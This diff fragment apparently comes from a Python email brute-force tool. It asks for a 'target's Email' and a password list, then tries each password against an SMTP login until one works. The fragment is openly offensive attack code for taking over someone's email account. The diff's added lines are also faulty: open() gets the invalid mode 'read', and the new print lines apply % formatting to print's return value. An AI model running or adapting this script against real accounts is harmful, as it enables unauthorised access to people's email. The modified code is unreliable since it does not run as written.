@@ -9,15 +9,15 @@ smtpserver.starttls()
 
 user= input ("Enter target's Email :")
 passwfile= input ("Enter password File :")
-passwfile= open(passwfile, "r")
+passwfile= open(passwfile, "read")
 
 for password in passwfile :
     try :
         smtpserver.login(user, password)
-        print ("[✓] password found ===> ", password)
+        print ("[✓] password found ===> %s") % password
         break ;
         
     except smtplib.SMTPAuthenticationError:
-        print ("[!] password  incorrect ===> ", password)
+        print ("[!] password  incorrect ===> %s") % password
         
         
